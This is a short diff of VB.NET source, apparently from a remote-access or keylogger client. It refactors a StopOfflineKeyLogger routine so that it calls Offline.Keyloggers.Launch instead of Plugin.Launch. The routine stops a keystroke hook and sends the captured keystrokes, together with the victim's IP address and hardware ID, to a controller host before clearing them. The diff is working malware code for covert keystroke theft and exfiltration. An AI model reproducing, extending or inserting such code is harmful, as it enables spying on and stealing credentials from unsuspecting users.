@@ -69,9 +69,9 @@ Namespace Client
         End Function
 
         Private Sub StopOfflineKeyLogger()
-            Plugin.Launch.StopHook()
-            Plugin.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, New KeylogOfflinePacket(Plugin.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID))
-            Plugin.Launch.ClearKeyStroke()
+            Offline.Keyloggers.Launch.StopHook()
+            Offline.Keyloggers.Launch.ClientSender(EntryClass.clientHandler.host, Config.generalKey, New KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), EntryClass.clientHandler.baseIp, EntryClass.clientHandler.HWID))
+            Offline.Keyloggers.Launch.ClearKeyStroke()
             EntryClass.KeylogOn = False
         End Sub
 
